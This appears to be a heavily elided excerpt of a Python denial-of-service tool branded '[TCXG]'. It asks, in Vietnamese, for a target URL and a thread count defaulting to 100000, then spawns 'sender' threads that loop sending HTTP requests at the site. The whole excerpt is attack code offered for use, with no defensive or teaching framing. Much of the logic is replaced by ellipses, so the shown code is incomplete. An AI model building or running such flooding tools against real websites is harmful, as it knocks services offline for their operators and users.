...
class sender(threading.Thread):
    ...
    def request(self):
        ...
        req = urllib.request.Request(self.url, data, self.headers, self.accept)
        urllib.request.urlopen(req)
        print(Fore.GREEN+'[TCXG] Connected Website: '+Fore.CYAN+'%s\r\n' % self.url)  
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                sys.stdout.write(Fore.RED+'[TCXG] Connection Website : '+Fore.BLUE+'TuyetChinhXinhGaiNhutttttt !!\n') 
                sys.exit(0)
...
"""      
        ...
        try:
            ...
            url = str(input(f"{Fore.RED}[TCXG]   Nhập Url/Target: {Fore.RESET}"))
        except:
            os.system('cls' if os.name == 'nt' else 'clear')
			#url = sys.argv[1]
            ...
            try:
                ...
                num_threads = str(input(f"{Fore.RED}[TCXG]   Threads (100000): {Fore.RESET}"))
                if num_threads == '':
